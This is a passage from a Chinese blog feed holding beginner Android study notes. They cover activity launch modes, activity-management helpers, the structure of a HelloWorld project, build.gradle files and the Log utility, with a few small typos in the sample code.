id="standard"><a href="#standard" class="headerlink" title="standard"></a>standard</h3><p>standard是活动默认的启动模式。在standard模式下，每当启动一个新的活动，它就会在返回栈中入栈，并处于栈顶位置。对于使用standard模式的活动，系统不会在乎这个活动是否已经在返回栈中存在，每次intent启动都会创建该活动的一个新实例。</p><h3 id="singleTop"><a href="#singleTop" class="headerlink" title="singleTop"></a>singleTop</h3><p>当活动启动模式指定为singleTop时，在启动活动时如果发现返回栈的栈顶已经是该活动，则认为可以直接使用它，不会再创建新的活动实例。</p><h3 id="singleTask"><a href="#singleTask" class="headerlink" title="singleTask"></a>singleTask</h3><p>当活动启动模式指定为singleTask时，每次启动该活动时系统首先会在返回栈中检查是否存在该活动的实例，如果发现已经存在则直接使用该实例，并把在这个活动之上的所有活动统统出栈；如果没有发现则会创建一个新的活动实例</p><h3 id="singleInstance"><a href="#singleInstance" class="headerlink" title="singleInstance"></a>singleInstance</h3><p>singleInstance模式的活动会启用一个新的返回栈来管理这个活动（其实如果singleTask模式指定了不同的taskAffinity，也会启动一个新的返回栈）。</p><p>在这种模式下，当允许活动被其他程序调用时，就会有一个单独的返回栈来管理这个活动，不管是哪个应用程序来访问这个活动，都共用同一个返回栈，从而实现共享活动实例。</p><p><img src="./day2/2.jpg" alt=""></p><h2 id="活动的最佳实践"><a href="#活动的最佳实践" class="headerlink" title="活动的最佳实践"></a>活动的最佳实践</h2><h3 id="知晓当前是在哪个活动"><a href="#知晓当前是在哪个活动" class="headerlink" title="知晓当前是在哪个活动"></a>知晓当前是在哪个活动</h3><p>这些选择在ActivityTest项目基础上修改。</p><p>首先新建一个BaseActivity类，继承androidx.appcompat.app.AppCompatActivity，然后重写onCreate()方法：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Override</span></span><br><span class="line"><span class="function"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title">onCreate</span><span class="params">(Bundle savedInstanceState)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">super</span>.onCreate(savedInstanceState);</span><br><span class="line">    Log.d(<span class="string">"BaseActivity"</span>, getClass().getSimpleName());</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>然后让所有的活动都继承BaseActivity而非AppCompatActivity。这样就可以Logcat中实时知晓当前界面对应哪一个活动了。</p><h3 id="随时随地退出程序"><a href="#随时随地退出程序" class="headerlink" title="随时随地退出程序"></a>随时随地退出程序</h3><p>新建一个ActivityCollector类作为活动管理器：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">ActivityCollector</span> </span>&#123;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> List&lt;Activity&gt; activities = <span class="keyword">new</span> ArrayList();</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">addActivity</span><span class="params">(Activity activity)</span></span>&#123;</span><br><span class="line">        activities.add(activity);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">removeActivity</span><span class="params">(Activity activity)</span></span>&#123;</span><br><span class="line">        activities.remove(activity);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">finishAll</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">for</span> (Activity activity : activities)&#123;</span><br><span class="line">            <span class="keyword">if</span>(!activity.isFinishing())&#123;</span><br><span class="line">                activity.finish();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>下面修改BASEActivity中的代码：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">BaseActivity</span> <span class="keyword">extends</span> <span class="title">AppCompatActivity</span> </span>&#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title">onCreate</span><span class="params">(Bundle savedInstanceState)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">super</span>.onCreate(savedInstanceState);</span><br><span class="line">        Log.d(<span class="string">"BaseActivity"</span>, getClass().getSimpleName());</span><br><span class="line">        ActivityCollector.addActivity(<span class="keyword">this</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title">onDestroy</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">super</span>.onDestroy();</span><br><span class="line">        ActivityCollector.removeActivity(<span class="keyword">this</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>从此，不管在什么地方想要退出程序，只需要调用ActivityCollector.FinishAll()就可以了。</p><p>另外，可以使用如下代码杀掉当前进程：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">android.os.Process.killProcess(android.os.Process.myPid());</span><br></pre></td></tr></table></figure><h3 id="启动活动的最佳写法"><a href="#启动活动的最佳写法" class="headerlink" title="启动活动的最佳写法"></a>启动活动的最佳写法</h3><p>比如在SecondActivity中添加如下代码：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">actionStart</span><span class="params">(Context context, String data1, String data2)</span></span>&#123;</span><br><span class="line">    Intent intent=<span class="keyword">new</span> Intent(context, SecondActivity<span class="class">.<span class="keyword">class</span>)</span>;</span><br><span class="line">    intent.purExtra(<span class="string">"param1"</span>, data1);</span><br><span class="line">    intent.purExtra(<span class="string">"param1"</span>, data2);</span><br><span class="line">    context.startActivity(intent);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这样修改后，如果要在FirstActivity中启动SecondActivity，使用以下代码即可：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SecondActivity.actionStart(FirstActivity.<span class="keyword">this</span>, <span class="string">"data1"</span>, <span class="string">"data2"</span>);</span><br></pre></td></tr></table></figure><p>这样做的好处就是可以明确知道传递的参数。</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;探究活动&quot;&gt;&lt;a href=&quot;#探究活动&quot; class=&quot;headerlink&quot; title=&quot;探究活动&quot;&gt;&lt;/a&gt;探究活动&lt;/h1&gt;&lt;h2 id=&quot;什么是活动&quot;&gt;&lt;a href=&quot;#什么是活动&quot; class=&quot;headerlink&quot; title=&quot;什么是活动&quot;&gt;
      
    
    </summary>
    
    
      <category term="Android" scheme="https://nuoye-blog.github.io/categories/Android/"/>
    
    
      <category term="Android" scheme="https://nuoye-blog.github.io/tags/Android/"/>
    
      <category term="开发" scheme="https://nuoye-blog.github.io/tags/%E5%BC%80%E5%8F%91/"/>
    
  </entry>
  
  <entry>
    <title>Android-day1</title>
    <link href="https://nuoye-blog.github.io/2020/05/25/Android/Android-day1/"/>
    <id>https://nuoye-blog.github.io/2020/05/25/Android/Android-day1/</id>
    <published>2020-05-25T06:30:00.000Z</published>
    <updated>2020-05-25T06:30:50.781Z</updated>
    
    <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>因linux下的前景较窄，所以想了解下android下的一些内容，准备了好久，今天就正式吧。目前第一本书：《第一行代码:Android》。</p><h1 id="正文"><a href="#正文" class="headerlink" title="正文"></a>正文</h1><h2 id="Android系统架构"><a href="#Android系统架构" class="headerlink" title="Android系统架构"></a>Android系统架构</h2><p>Linux内核层</p><p>系统运行库层</p><p>应用框架层</p><p>应用层</p><h2 id="Android应用开发特色"><a href="#Android应用开发特色" class="headerlink" title="Android应用开发特色"></a>Android应用开发特色</h2><h5 id="四大组件"><a href="#四大组件" class="headerlink" title="四大组件"></a>四大组件</h5><p>活动（Activity）、服务（Service）、广播接收器（Broadcast Receiver）、内容提供器（Content Provider）</p><h5 id="丰富的系统控件"><a href="#丰富的系统控件" class="headerlink" title="丰富的系统控件"></a>丰富的系统控件</h5><h5 id="SQLite数据库"><a href="#SQLite数据库" class="headerlink" title="SQLite数据库"></a>SQLite数据库</h5><h5 id="强大的多媒体"><a href="#强大的多媒体" class="headerlink" title="强大的多媒体"></a>强大的多媒体</h5><h5 id="地理位置定位"><a href="#地理位置定位" class="headerlink" title="地理位置定位"></a>地理位置定位</h5><h2 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h2><p>首先下载Android Studio：<a href="https://developer.android.google.cn/studio" target="_blank" rel="noopener">https://developer.android.google.cn/studio</a></p><p>安装的话直接跟着走就可以了，总的搭建过程还是比较简单的。</p><p>其中配置的时候会选择custom（自定义配置）还是standard（默认配置），看心情选吧。。</p><h2 id="第一个Android项目"><a href="#第一个Android项目" class="headerlink" title="第一个Android项目"></a>第一个Android项目</h2><h3 id="创建HelloWorld项目"><a href="#创建HelloWorld项目" class="headerlink" title="创建HelloWorld项目"></a>创建HelloWorld项目</h3><p>首先打开界面：</p><p><img src="./day1/1.jpg" alt=""></p><p>点击start a new Android Studio project，然后开始选择模板。</p><p><img src="./day1/2.jpg" alt=""></p><p>这里直接选择Empty Activity，并做如下配置：</p><p><img src="./day1/3.jpg" alt=""></p><p>点击Finish，等待一段时间后项目便创建成功了。</p><h3 id="启动模拟器"><a href="#启动模拟器" class="headerlink" title="启动模拟器"></a>启动模拟器</h3><p>点击右上角的图标：</p><p><img src="./day1/4.jpg" alt=""></p><p>默认已经有了Nexus 5X这台设备模拟器了，然后点击Actions栏最左边的三角形按钮即可启动（因为我是amd的cpu，安装不了hxam，armeabi-v7a的镜像也比较慢，所以用bluestacks来代替）。</p><h3 id="编译"><a href="#编译" class="headerlink" title="编译"></a>编译</h3><p>点击这个锤子</p><p><img src="./day1/5.png" alt=""></p><p>等待编译完成后，就可以在项目下的app\build\outputs\apk\debug中找到编译好的apk。</p><h3 id="安装运行"><a href="#安装运行" class="headerlink" title="安装运行"></a>安装运行</h3><p>直接将apk文件拖到bluestacks中，点击图标启动即可：</p><p><img src="./day1/6.jpg" alt=""></p><h2 id="分析HelloWorld项目"><a href="#分析HelloWorld项目" class="headerlink" title="分析HelloWorld项目"></a>分析HelloWorld项目</h2><p>在左侧资源端口可以看到HelloWorld项目，点击箭头打开可以看到如下：</p><p><img src="./day1/7.jpg" alt=""></p><h3 id="目录分析"><a href="#目录分析" class="headerlink" title="目录分析"></a>目录分析</h3><h4 id="一级目录"><a href="#一级目录" class="headerlink" title="一级目录"></a>一级目录</h4><h5 id="gradle和-idea"><a href="#gradle和-idea" class="headerlink" title=".gradle和.idea"></a>.gradle和.idea</h5><p>这两个目录下放置的都是Android Studio自动生成的一些文件。</p><h5 id="app"><a href="#app" class="headerlink" title="app"></a>app</h5><p>项目中的代码、资源等内容几乎都是放置在这个目录下的。</p><h5 id="build"><a href="#build" class="headerlink" title="build"></a>build</h5><p>主要包含了一些在编译时自动生成的文件。（本地没有，但书上有说，也放进来以备用）</p><h5 id="gradle"><a href="#gradle" class="headerlink" title="gradle"></a>gradle</h5><p>这个目录下包含了gradle wrapper的配置文件。Android Studio默认没有gradle wrapper方式，如需要打开，可以点击File -&gt; Settings -&gt; Build, Execution, Deployment -&gt; Gradle进行配置。</p><h5 id="gitignore"><a href="#gitignore" class="headerlink" title=".gitignore"></a>.gitignore</h5><p>这个文件是用来将指定的目录或文件排除在版本控制之外的。</p><h5 id="build-gradle"><a href="#build-gradle" class="headerlink" title="build.gradle"></a>build.gradle</h5><p>这是项目全局的gradle构建脚本。</p><h5 id="gradle-properties"><a href="#gradle-properties" class="headerlink" title="gradle.properties"></a>gradle.properties</h5><p>这个文件是全局的gradle配置文件。在这里配置的属性会影响到项目中所有的gradle编译脚本。</p><h5 id="gradlew和gradlew-bat"><a href="#gradlew和gradlew-bat" class="headerlink" title="gradlew和gradlew.bat"></a>gradlew和gradlew.bat</h5><p>这两个文件是用来在命令行界面中执行gradle命令的，其中gradlew是在Linux或Max系统中使用，gradlew.bat是在Windows系统中使用。</p><h5 id="HelloWorld-iml"><a href="#HelloWorld-iml" class="headerlink" title="HelloWorld.iml"></a>HelloWorld.iml</h5><p>iml文件是所有IntelliJ IDEA项目都会自动生成的文件，用于标识这是一个IntelliJ IDEA项目。</p><h5 id="local-properties"><a href="#local-properties" class="headerlink" title="local.properties"></a>local.properties</h5><p>这个文件用于指定本机中的Android SDK路径。</p><h5 id="settings-gradle"><a href="#settings-gradle" class="headerlink" title="settings.gradle"></a>settings.gradle</h5><p>这个文件用于指定项目中所有引入的模块。</p><h4 id="app目录"><a href="#app目录" class="headerlink" title="app目录"></a>app目录</h4><p><img src="./day1/8.jpg" alt=""></p><h5 id="build-1"><a href="#build-1" class="headerlink" title="build"></a>build</h5><p>与外层的build目录类似。</p><h5 id="libs"><a href="#libs" class="headerlink" title="libs"></a>libs</h5><p>如果项目中使用了第三方jar包，就需要把这些jar包都放在libs目录下，放在这个目录下的jar包都会被自动添加到构建路径里去。</p><h5 id="androidTest"><a href="#androidTest" class="headerlink" title="androidTest"></a>androidTest</h5><p>此处是用来编写Android Test测试用例的，可以对项目进行一些自动化测试。</p><h5 id="java"><a href="#java" class="headerlink" title="java"></a>java</h5><p>用来方式所有java代码的地方。</p><h5 id="res"><a href="#res" class="headerlink" title="res"></a>res</h5><p>项目中使用到的所有图片、布局、字符串等资源都要存放在这个目录下。图片放在drawable目录下，布局放在layout目录下，字符串放在values目录下。</p><h5 id="AndroidManifest-xml"><a href="#AndroidManifest-xml" class="headerlink" title="AndroidManifest.xml"></a>AndroidManifest.xml</h5><p>这是整个Android项目的配置文件，程序中定义的所有四大组件都需要在这个文件里注册，另外还可以在这个文件中给应用程序添加权限声明。</p><h5 id="test"><a href="#test" class="headerlink" title="test"></a>test</h5><p>此处是用来编写Unit Test测试用例的，是对项目进行自动化测试的另一种方式。</p><h5 id="gitignore-1"><a href="#gitignore-1" class="headerlink" title=".gitignore"></a>.gitignore</h5><p>这个文件用于将app模块内的指定目录或文件排除在版本控制之外，作用和外层的.gitignore类似。</p><h5 id="app-iml"><a href="#app-iml" class="headerlink" title="app.iml"></a>app.iml</h5><p>IntelliJ IDEA项目自动生成的文件。</p><h5 id="build-gradle-1"><a href="#build-gradle-1" class="headerlink" title="build.gradle"></a>build.gradle</h5><p>这是app模块的gradle构建脚本。</p><h5 id="proguard-rules-pro"><a href="#proguard-rules-pro" class="headerlink" title="proguard-rules.pro"></a>proguard-rules.pro</h5><p>这个文件用于指定项目代码的混淆规则。</p><h3 id="项目运行分析"><a href="#项目运行分析" class="headerlink" title="项目运行分析"></a>项目运行分析</h3><p>首先是打开AndroidManifest.xml找到如下代码：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">activity</span> <span class="attr">android:name</span>=<span class="string">".MainActivity"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">intent-filter</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">action</span> <span class="attr">android:name</span>=<span class="string">"android.intent.action.MAIN"</span> /&gt;</span></span><br><span class="line"></span><br><span class="line">        <span class="tag">&lt;<span class="name">category</span> <span class="attr">android:name</span>=<span class="string">"android.intent.category.LAUNCHER"</span> /&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">intent-filter</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">activity</span>&gt;</span></span><br></pre></td></tr></table></figure><p>这段代码表示对MainActivity这个活动进行注册（没有在AndroidManifest.xml中进行注册的活动是不能使用的）。</p><p>intent-filter里面， <code>&lt;action android:name=&quot;android.intent.action.MAIN&quot; /&gt;</code>表示这个activity是主入口，即启动程序时首先运行的就是这个活动；<code>&lt;category android:name=&quot;android.intent.category.LAUNCHER&quot; /&gt;</code>表示这个activity种类，要加到LAUNCHER程序列表里面。</p><p>然后再看下MainActivity这个活动的代码：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">MainActivity</span> <span class="keyword">extends</span> <span class="title">AppCompatActivity</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title">onCreate</span><span class="params">(Bundle savedInstanceState)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">super</span>.onCreate(savedInstanceState);</span><br><span class="line">        setContentView(R.layout.activity_main);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>可以看到MainActivity是继承自AppCompatActivity的，这是一种向下兼容的Activity，可以将Activity在各个系统版本中增加的特性和功能最低兼容到Android 2.1系统。</p><p>然后是onCreate()方法，这个方法是一个活动被创建时必定要执行的方法。</p><p>接着调用了setContentView()方法，这个方法给当前的活动引入了一个activity_main布局，可以在res/layout目录下找到它。</p><p>打开并切换到代码视图，代码如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version&#x3D;&quot;1.0&quot; encoding&#x3D;&quot;utf-8&quot;?&gt;</span><br><span class="line">&lt;androidx.constraintlayout.widget.ConstraintLayout xmlns:android&#x3D;&quot;http:&#x2F;&#x2F;schemas.android.com&#x2F;apk&#x2F;res&#x2F;android&quot;</span><br><span class="line">    xmlns:app&#x3D;&quot;http:&#x2F;&#x2F;schemas.android.com&#x2F;apk&#x2F;res-auto&quot;</span><br><span class="line">    xmlns:tools&#x3D;&quot;http:&#x2F;&#x2F;schemas.android.com&#x2F;tools&quot;</span><br><span class="line">    android:layout_width&#x3D;&quot;match_parent&quot;</span><br><span class="line">    android:layout_height&#x3D;&quot;match_parent&quot;</span><br><span class="line">    tools:context&#x3D;&quot;.MainActivity&quot;&gt;</span><br><span class="line"></span><br><span class="line">    &lt;TextView</span><br><span class="line">        android:layout_width&#x3D;&quot;wrap_content&quot;</span><br><span class="line">        android:layout_height&#x3D;&quot;wrap_content&quot;</span><br><span class="line">        android:text&#x3D;&quot;Hello World!&quot;</span><br><span class="line">        app:layout_constraintBottom_toBottomOf&#x3D;&quot;parent&quot;</span><br><span class="line">        app:layout_constraintLeft_toLeftOf&#x3D;&quot;parent&quot;</span><br><span class="line">        app:layout_constraintRight_toRightOf&#x3D;&quot;parent&quot;</span><br><span class="line">        app:layout_constraintTop_toTopOf&#x3D;&quot;parent&quot; &#x2F;&gt;</span><br><span class="line"></span><br><span class="line">&lt;&#x2F;androidx.constraintlayout.widget.ConstraintLayout&gt;</span><br></pre></td></tr></table></figure><p>其中TextView是Android系统提供的一个控件，用于在布局中显示文字。可以看到<code>android:text=&quot;Hello World!&quot;</code>这句代码的定义，也就是我们上面屏幕中所显示的<code>Hello World!</code>。</p><h3 id="详细项目中的资源"><a href="#详细项目中的资源" class="headerlink" title="详细项目中的资源"></a>详细项目中的资源</h3><p>res目录下，所有以drawable开头的文件夹都是用来放图片的，所有以mipmap开头的文件夹都是用来放应用图标的，所有以values开头的文件夹都是用来放字符串、样式、颜色等配置的，layout文件夹是用来放布局文件的。之所以有那么多相同开头的文件夹，主要是为了让程序能更好的兼容各种设备。</p><h4 id="使用资源"><a href="#使用资源" class="headerlink" title="使用资源"></a>使用资源</h4><p>打开res/value/strings.xml，内容如下所示：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">resources</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">string</span> <span class="attr">name</span>=<span class="string">"app_name"</span>&gt;</span>HelloWorld<span class="tag">&lt;/<span class="name">string</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">resources</span>&gt;</span></span><br></pre></td></tr></table></figure><p>有以下两种方式来使用它：</p><ul><li>在代码中通过R.string.app_name引用</li><li>在xml中通过@string/app_name引用</li></ul><p>其中tring可以替换成drawable、mipmap、layout之类的内容。</p><h4 id="详解build-gradle文件"><a href="#详解build-gradle文件" class="headerlink" title="详解build.gradle文件"></a>详解build.gradle文件</h4><p>首先看下外层的build.gradle文件：</p><figure class="highlight gradle"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// Top-level build file where you can add configuration options common to all sub-projects/modules.</span></span><br><span class="line"><span class="keyword">buildscript</span> &#123;</span><br><span class="line">    <span class="keyword">repositories</span> &#123;</span><br><span class="line">        google()</span><br><span class="line">        jcenter()</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">dependencies</span> &#123;</span><br><span class="line">        <span class="keyword">classpath</span> <span class="string">'com.android.tools.build:gradle:3.6.3'</span></span><br><span class="line">        <span class="comment">// <span class="doctag">NOTE:</span> Do not place your application dependencies here; they belong</span></span><br><span class="line">        <span class="comment">// in the individual module build.gradle files</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">allprojects</span> &#123;</span><br><span class="line">    <span class="keyword">repositories</span> &#123;</span><br><span class="line">        google()</span><br><span class="line">        jcenter()</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">task</span> clean(type: <span class="keyword">Delete</span>) &#123;</span><br><span class="line">    <span class="keyword">delete</span> rootProject.buildDir</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>首先，两处repositories的闭包中都声明了google()和jcenter()配置，声明了这两行后，就可以在项目中轻松引用任何jcenter和google上的开源项目。</p><p>dependencies闭包中使用了classpath声明一个gradle插件。</p><p>接着分析下app目录下的build.gradle文件：</p><figure class="highlight gradle"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line">apply plugin: <span class="string">'com.android.application'</span></span><br><span class="line"></span><br><span class="line">android &#123;</span><br><span class="line">    compileSdkVersion <span class="number">29</span></span><br><span class="line">    buildToolsVersion <span class="string">"29.0.3"</span></span><br><span class="line"></span><br><span class="line">    defaultConfig &#123;</span><br><span class="line">        applicationId <span class="string">"com.example.helloworld"</span></span><br><span class="line">        minSdkVersion <span class="number">16</span></span><br><span class="line">        targetSdkVersion <span class="number">29</span></span><br><span class="line">        versionCode <span class="number">1</span></span><br><span class="line">        versionName <span class="string">"1.0"</span></span><br><span class="line"></span><br><span class="line">        testInstrumentationRunner <span class="string">"androidx.test.runner.AndroidJUnitRunner"</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    buildTypes &#123;</span><br><span class="line">        release &#123;</span><br><span class="line">            minifyEnabled <span class="keyword">false</span></span><br><span class="line">            proguardFiles getDefaultProguardFile(<span class="string">'proguard-android-optimize.txt'</span>), <span class="string">'proguard-rules.pro'</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">dependencies</span> &#123;</span><br><span class="line">    implementation <span class="keyword">fileTree</span>(dir: <span class="string">'libs'</span>, <span class="keyword">include</span>: [<span class="string">'*.jar'</span>])</span><br><span class="line"></span><br><span class="line">    implementation <span class="string">'androidx.appcompat:appcompat:1.0.2'</span></span><br><span class="line">    implementation <span class="string">'androidx.constraintlayout:constraintlayout:1.1.3'</span></span><br><span class="line">    testImplementation <span class="string">'junit:junit:4.12'</span></span><br><span class="line">    androidTestImplementation <span class="string">'androidx.test.ext:junit:1.1.1'</span></span><br><span class="line">    androidTestImplementation <span class="string">'androidx.test.espresso:espresso-core:3.2.0'</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>第一行应用了一个插件，一般有两种值可选：com.android.application表示这是一个应用程序插件，com.android.library表示这是一个库模块。</p><p>接下来是android闭包，这个闭包中我们可以配置项目构建的各种属性，其中compileSdkVersion用于指定项目构建工具的版本。</p><p>同时，android闭包中又嵌套了一个defaultConfig闭包，defaultConfig闭包中可以对项目的更多细节进行配置。其中applicationId用于指定项目的包名，minSdkVersion用于指定项目最低兼容的Android系统版本。targetSdkVersion指定的值表示在该项目上已做过了充分的测试，系统将会为你的应用程序启动一些最新的功能和特性。versionCode用于指定项目的版本号。versionName用于指定项目的版本名。</p><p>然后再分析下buildTypes闭包。buildTypes闭包中用于指定生成安装文件的相关配置，其中的debug闭包（这里没有）用于指定生成测试版安装文件的配置，release闭包用于指定生成正式版安装文件的配置。minifyEnabled用于指定是否对项目的代码进行混淆。proguardFiles用于指定混淆时使用的规则文件，其中proguard-android.txt是所有项目通用的混淆规则，第二个proguard-rules.pro是当前项目的根目录下的，可以编写当前项目特有的混淆规则。</p><p>然后是dependencies闭包。这个闭包指定用来当前项目所有的依赖关系。Android Studio项目一共有3中依赖方式：</p><ul><li>本地依赖：可以对本地的jar包或目录添加依赖关系。</li><li>库依赖：可以对项目中的库模块添加依赖关系。</li><li>远程依赖：可以对jcenter库和google库上的开源项目添加依赖关系。</li></ul><p>dependencies闭包中的第一行implementation fileTree就是一个本地依赖声明，它表示将libs目录下所有.jar后缀的文件都添加到项目的构建路径当中。</p><p>第二行implementation则是远程依赖声明，<code>androidx.appcompat:appcompat:1.0.2</code>和<code>androidx.constraintlayout:constraintlayout:1.1.3</code>是一个标准的远程依赖库格式，androidx.constraintlayout是域名部分，constraintlayout是组名，1.1.3是版本号。加上这句声明后，Gradle在构建项目时会首先检查下本地是否已经有这个库的缓存，如果没有的话则会去自动联网下载，然后再添加到项目的构建路径当中。</p><p>testImplementation用于声明测试用例库，这个暂时用不到。</p><h2 id="日志工具"><a href="#日志工具" class="headerlink" title="日志工具"></a>日志工具</h2><h3 id="Log"><a href="#Log" class="headerlink" title="Log"></a>Log</h3><p>android的日志工具是Log，这个类中提供了如下5个方法供我们打印日志：</p><ul><li>log.v()用于打印最琐碎，意义最小的日志信息。</li><li>log.d()用于打印调试信息。</li><li>log.i()用于打印比较重要的数据。</li><li>log.w()用于打印一些警告信息。</li><li>log.e()用于打印程序中的错误信息。</li></ul><h5 id="示例："><a href="#示例：" class="headerlink" title="示例："></a>示例：</h5><p>在MainActivity的onCreate()方法中添加一行打印日志语句：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Log.d(<span class="string">"MainActivity"</span>,<span class="string">"onCreate 